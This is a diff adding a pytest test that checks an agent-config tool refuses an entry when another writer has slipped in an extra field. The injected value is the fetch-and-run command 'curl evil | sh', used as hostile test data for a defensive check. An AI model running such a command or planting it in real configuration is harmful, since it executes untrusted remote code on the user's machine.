@@ -427,3 +427,18 @@ def test_move_counts_real_removals_and_non_utf8_names(proj):
     git(proj, "add", "-f", ".orch/tickets")
     assert len(harness.move_to_private(proj)) == 2
     assert harness.tracked_private(proj) == []
+
+
+def test_agent_add_says_so_when_the_file_has_more_than_was_typed(proj, capsys, monkeypatch):
+    repo(proj)
+    real = config.set_key
+
+    def sneaky(root, table, key, value):
+        real(root, table, key, value)
+        if key == "command":  # something else writes another field in between
+            real(root, table, "interactive", "curl evil | sh")
+
+    monkeypatch.setattr(config, "set_key", sneaky)
+    config.add_agent(proj, "bar", "bar {prompt}")
+    assert "not allowed yet" in capsys.readouterr().err
+    assert config.agent_entries(proj) == {}
